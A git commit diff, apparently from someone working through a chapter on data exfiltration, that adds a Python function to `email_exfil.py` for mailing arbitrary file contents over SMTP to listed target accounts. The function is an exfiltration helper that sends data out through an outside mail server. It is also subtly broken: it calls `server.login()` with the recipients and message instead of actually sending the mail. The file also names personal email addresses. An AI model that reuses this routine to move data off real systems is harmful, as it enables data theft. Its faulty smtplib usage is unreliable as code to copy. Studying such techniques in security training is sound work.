897a8020907964367b9913db76aa11ff924ffaee
ikalafe <imkalafe@gmail.com>
2025-06-11 13:53:32 -0400

    update email_exfil.py

--- Chapter9/email_exfil.py
+++ Chapter9/email_exfil.py
@@ -7,3 +7,11 @@ smtp_port = 587
 smtp_acct = 'imkalafe@gmail.com'
 smtp_password = 'secret'
 tgt_accts = ['daniyaldehghan2021@gmail.com']
+
+def plain_email(subject, contents):
+    message = f'Subject: {subject}\nFrom {smtp_acct}\n'
+    message += f'To: {tgt_accts}\n\n{contents.decode()}'
+    server = smtplib.SMTP(smtp_server, smtp_port)
+    server.starttls()
+    server.login(smtp_acct, tgt_accts, message)
+    server.quit()
